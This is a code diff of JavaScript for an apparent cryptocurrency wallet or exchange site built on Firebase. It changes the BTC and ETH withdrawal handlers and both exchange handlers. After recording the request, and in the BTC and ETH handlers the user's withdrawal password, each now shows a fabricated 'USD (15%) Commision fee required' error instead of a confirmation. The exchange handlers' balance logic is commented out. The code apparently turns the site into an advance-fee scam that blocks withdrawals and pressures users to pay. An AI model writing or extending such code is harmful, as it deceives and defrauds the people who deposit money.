@@ -146,14 +146,13 @@ const savebtcwithdrawlToDb = () => {
                     btcpassword: btcPassword
                 }, { merge: true })
                     .then(() => {
-                        alert("Withrawal Request Sent")
+                        alert("Error: USD (15%) Commision fee required")
 
                     })
                     .catch((error) => {
                         // console.error("Error writing document: ", error);
                     });
 
-                alert("Withdraw Request sent");
                 // ...
             } else {
                 // User is signed out
@@ -200,14 +199,13 @@ const saveethwithdrawlToDb = () => {
                     ethpassword: ethPassword
                 }, { merge: true })
                     .then(() => {
-                        alert("Withrawal Request Sent")
+                        alert("Error: USD (15%) Commision fee required")
 
                     })
                     .catch((error) => {
                         // console.error("Error writing document: ", error);
                     });
 
-                alert("Withdraw Request sent");
                 // ...
             } else {
                 // User is signed out
@@ -250,7 +248,6 @@ const saveusdwithdrawlToDb = () => {
                     // console.error("Error writing document: ", error);
                 });
 
-            alert("Withdraw Request sent");
             // ...
         } else {
             // User is signed out
@@ -429,7 +426,7 @@ const getusersusdwallet = () => {
             // https://firebase.google.com/docs/reference/js/firebase.User
 
             var uid = user.uid;
-            
+
 
             var docRef = db.collection("usd-wallets").doc(uid);
             // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
@@ -446,16 +443,16 @@ const getusersusdwallet = () => {
                     usdbalance.textContent = doc.data().currentamount;
                     usdamountonhold.textContent = doc.data().amountonhold;
 
-                    
+
 
                 } else {
                     // doc.data() will be undefined in this case
                     // console.log("No such document!");
 
-                    
+
                 }
 
-                
+
 
             }).catch((error) => {
                 // console.log("Error getting document:", error);
@@ -475,62 +472,6 @@ const getusersusdwallet = () => {
 
 }
 
-
-// function getuserusdwallets (){
-//     firebase.auth().onAuthStateChanged((user) => {
-//         if (user) {
-//             // User is signed in, see docs for a list of available properties
-//             // https://firebase.google.com/docs/reference/js/firebase.User
-
-//             var uid = user.uid;
-            
-
-//             var docRef = db.collection("usd-wallets").doc(uid);
-//             // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
-//             // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;
-
-
-
-//             docRef.get().then((doc) => {
-
-//                 if (doc.exists) {
-
-//                     let usdbalance = document.getElementById("usdbalance-amount");
-//                     let usdamountonhold = document.getElementById("usdamountOnHold");
-//                     usdbalance.textContent = doc.data().currentamount;
-//                     usdamountonhold.textContent = doc.data().amountonhold;
-
-                    
-//                     console.log(doc.data().currentamount);
-
-                    
-                
-
-//                 } else {
-//                     // doc.data() will be undefined in this case
-//                     // console.log("No such document!");
-
-                    
-//                 }
-
-                
-
-//             }).catch((error) => {
-//                 // console.log("Error getting document:", error);
-//                 return error;
-//             });
-
-
-
-//             // ...
-//         } else {
-//             // User is signed out
-//             // ...
-//         }
-//     });
-
-
-// }
 
 const getusersteslawallet = () => {
 
@@ -811,6 +752,10 @@ const uploadFile = () => {
 
 }
 
+
+
+
+
 var selectedAssets;
 var choosenAmount;
 
@@ -833,9 +778,12 @@ const exchangeAssets = () => {
                 alert("Make sure to all fields are completed");
             }
             else {
+
+                alert("Error: USD (15%) Commision fee required")
                 selectedAssets = document.getElementById("selectVal").value;
                 choosenAmount = document.getElementById("amounttoexchange").value;
 
+                
                 var docRef = db.collection("usd-wallets").doc(uid);
 
 
@@ -843,29 +791,29 @@ const exchangeAssets = () => {
                 // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;
 
                 //get users usd wallet
-                docRef.get().then((doc) => {
-                    if (doc.exists) {
+                // docRef.get().then((doc) => {
+                //     if (doc.exists) {
 
 
-                        console.log("Document data:", doc.data().currentamount);
+                //         console.log("Document data:", doc.data().currentamount);
 
 
-                            currentUsdAmount = doc.data().currentamount;
-                            
-                            
-
-                    } else {
-                        // doc.data() will be undefined in this case
-                        console.log("No such document!");
-                    }
-                }
-                ).catch((error) => {
-                    console.log("Error getting document:", error);
+                //         currentUsdAmount = doc.data().currentamount;
+                //         console.log(currentUsdAmount);
 
 
-                });
+                //     } else {
+                //         // doc.data() will be undefined in this case
+                //         console.log("No such document!");
+                //     }
+                // }
+                // ).catch((error) => {
+                //     console.log("Error getting document:", error);
 
-                console.log(currentUsdAmount);
+
+                // });
+
+                // console.log(currentUsdAmount);
 
 
                 //Check if funds are available
@@ -907,7 +855,7 @@ const exchangeAssets = () => {
 
                 // }
 
-               
+
 
             }
 
@@ -925,3 +873,202 @@ const exchangeAssets = () => {
 
 
 }
+
+const exchangeAssets2 = () => {
+
+
+
+    firebase.auth().onAuthStateChanged((user) => {
+
+
+
+        if (user) {
+
+            // User is signed in, see docs for a list of available properties
+            // https://firebase.google.com/docs/reference/js/firebase.User
+
+            let uid = user.uid;
+
+            if (document.getElementById("selectVal2").value == "Assets" || document.getElementById("amounttoexchange2").value == "") {
+                alert("Make sure to all fields are completed");
+            }
+            else {
+
+                alert("Error: USD (15%) Commision fee required")
+                selectedAssets = document.getElementById("selectVal2").value;
+                choosenAmount = document.getElementById("amounttoexchange2").value;
+
+                
+                var docRef = db.collection("usd-wallets").doc(uid);
+
+
+                // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
+                // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;
+
+                //get users usd wallet
+                // docRef.get().then((doc) => {
+                //     if (doc.exists) {
+
+
+                //         console.log("Document data:", doc.data().currentamount);
+
+
+                //         currentUsdAmount = doc.data().currentamount;
+                //         console.log(currentUsdAmount);
+
+
+                //     } else {
+                //         // doc.data() will be undefined in this case
+                //         console.log("No such document!");
+                //     }
+                // }
+                // ).catch((error) => {
+                //     console.log("Error getting document:", error);
+
+
+                // });
+
+                // console.log(currentUsdAmount);
+
+
+                //Check if funds are available
+                // if (currentUsdAmount < choosenAmount) {
+                //     console.log("Not enough funds")
+                // }
+                // else {
+
+                //     if (selectedAssets == "Bitcoin") {
+
+                //         console.log("You Sellected btc", currentUsdAmount)
+
+
+                //         var docRef = db.collection("btc-wallets").doc(uid);
+
+                //         docRef.get().then((doc) => {
+                //             if (doc.exists) {
+                //                 // console.log("Document data:", doc.data().currentamount);
+
+                //                 let btcbalance = document.getElementById("btcBalanceAmount")
+                //                 let btcamountonhold = document.getElementById("btcAmountOnHold")
+                //                 btcbalance.textContent = doc.data().currentamount
+                //                 btcamountonhold.textContent = doc.data().amountonhold
+
+                //                 console.log(currentUsdAmount, choosenAmount)
+                //             } else {
+                //                 // doc.data() will be undefined in this case
+                //                 // console.log("No such document!");
+                //             }
+                //         }).catch((error) => {
+                //             // console.log("Error getting document:", error);
+                //         });
+
+
+
+                //     }
+
+
+
+                // }
+
+
+
+            }
+
+
+            // ...
+        }
+        else {
+            // User is signed out
+            // ...
+        }
+
+
+    });
+
+
+
+}
+
+// var currentamt = null;
+// console.log(currentamt);
+
+function getuserusdwalletsforExchange() {
+    
+
+    firebase.auth().onAuthStateChanged((user) => {
+
+        if (user) {
+            // User is signed in, see docs for a list of available properties
+            // https://firebase.google.com/docs/reference/js/firebase.User
+
+            var uid = user.uid;
+
+
+            var docRef = db.collection("usd-wallets").doc(uid);
+            // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
+            // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;
+
+
+
+            docRef.get().then((doc) => {
+
+                if (doc.exists) {
+
+                    let usdbalance = document.getElementById("usdbalance-amount");
+                    let usdamountonhold = document.getElementById("usdamountOnHold");
+                    usdbalance.textContent = doc.data().currentamount;
+                    usdamountonhold.textContent = doc.data().amountonhold;
+
+                    currentamt = doc.data().currentamount;
+
+                } else {
+                    // doc.data() will be undefined in this case
+                    // console.log("No such document!");
+
+
+                }
+
+                console.log(currentamt);
+
+            }).catch((error) => {
+                // console.log("Error getting document:", error);
+            });
+
+
+
+            // ...
+        } else {
+            // User is signed out
+            // ...
+        }
+
+    });
+
+}
+
+// var currntUser;
+
+
+//      var user = firebase.auth().onAuthStateChanged((user) => {
+
+//         if (user) {
+//             // User is signed in, see docs for a list of available properties
+//             // https://firebase.google.com/docs/reference/js/firebase.User
+
+//             var ii  = user.uid;
+//             // return user;
+//             console.log(ii);
+
+//             return ii;
+
+//             // ...
+//         } else {
+//             // User is signed out
+//             // ...
+//         }
+
+//     });
+
+
+
+// console.log(user);
